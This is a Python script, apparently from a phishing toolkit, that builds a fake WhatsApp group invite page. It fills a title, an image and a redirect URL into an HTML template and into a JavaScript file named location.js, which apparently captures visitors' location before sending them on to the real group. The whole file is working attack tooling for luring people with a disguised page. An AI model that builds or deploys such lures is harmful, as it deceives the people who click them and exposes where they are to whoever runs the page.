#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
redirect = os.getenv('REDIRECT')

if title is None:
    title = input(f'{G}[+] {C}Group Title : {W}')
else:
    utils.print(f'{G}[+] {C}Group Title :{W} '+title)

if image is None:
    image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
else:
    utils.print(f'{G}[+] {C}Group Image :{W} '+image)

if redirect is None:
    redirect = input(G + '[+]' + C + ' Enter WhatsApp Group URL : ' + W)
else:
    utils.print(f'{G}[+] {C}WhatsApp Group URL :{W} '+redirect)

img_name = utils.downloadImageFromUrl(image, 'template/whatsapp_redirect/images/')
if img_name :
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    try:
        shutil.copyfile(image, 'template/whatsapp_redirect/images/{}'.format(img_name))
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
        exit()

with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp_redirect/index.html', 'w') as new_index:
    new_index.write(code)

with open('template/whatsapp_redirect/js/location_temp.js', 'r') as js:
	reader = js.read()
	update = reader.replace('REDIRECT_URL', redirect)

with open('template/whatsapp_redirect/js/location.js', 'w') as js_update:
	js_update.write(update)